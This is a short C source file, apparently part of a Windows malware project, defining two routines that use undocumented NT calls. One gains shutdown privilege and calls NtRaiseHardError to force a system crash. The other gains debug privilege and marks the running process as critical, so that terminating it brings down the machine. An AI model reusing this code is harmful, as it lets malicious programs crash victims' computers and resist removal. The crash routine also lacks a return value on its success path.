#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

#if NT_FUNCTIONS == TRUE
// This is actually not used right now but included
BOOL fnNTRaiseHardError(VOID) {
	BOOLEAN bl;
	if (!RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bl)) {
		UINT u;
		if (NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, NULL, NULL, OPTION_SHUTDOWN_SYSTEM, &u)) {
			fnERRORHANDLERW(L"Failed to raise HardError", NULL, L"NtRaiseHardError", MB_ICONERROR);
			return FALSE;
		}
	} else {
		fnERRORHANDLERW(L"Couldn't set Shutdwon Privileges", NULL, L"RtlAdjustPrivilege", MB_ICONERROR);
		return FALSE;
	}
}

BOOL fnNTSetProcessIsCritical(
	_In_ BOOLEAN blIsCritical
) {
	BOOLEAN bl;
	if (!RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bl)) {
		if (!RtlSetProcessIsCritical(blIsCritical, NULL, FALSE)) {
			return TRUE;
		} else {
			fnERRORHANDLERW(L"Couldn't set Process Critical", NULL, L"RtlSetProcessIsCritical", MB_ICONERROR);
			return FALSE;
		}
	} else {
		fnERRORHANDLERW(L"Couldn't set Debug Privileges", NULL, L"RtlAdjustPrivilege", MB_ICONERROR);
		return FALSE;
	}
}
#endif // !DISABLE_NT_FUNCTIONS